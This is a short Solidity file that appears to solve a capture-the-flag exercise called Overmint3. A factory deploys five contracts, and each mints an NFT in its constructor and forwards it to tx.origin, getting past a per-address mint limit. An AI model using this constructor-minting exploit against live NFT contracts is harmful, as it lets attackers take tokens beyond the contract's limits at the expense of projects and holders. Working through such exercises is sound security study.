// SPDX-License-Identifier: GPL-3.0
pragma solidity 0.8.15;

import {Overmint3} from "../Overmint3.sol";

contract Overmint3Attacker {
    constructor(address _victimContract, uint256 tokenId) {
        Overmint3 victimContract = Overmint3(_victimContract);
        victimContract.mint();
        victimContract.transferFrom(address(this), tx.origin, tokenId);
    }
}

contract Overmint3AttackerFactory {
    constructor(address _victimContract) {
        for (uint256 i = 1; i < 6; ++i) {
            new Overmint3Attacker(_victimContract, i);
        }
    }
}
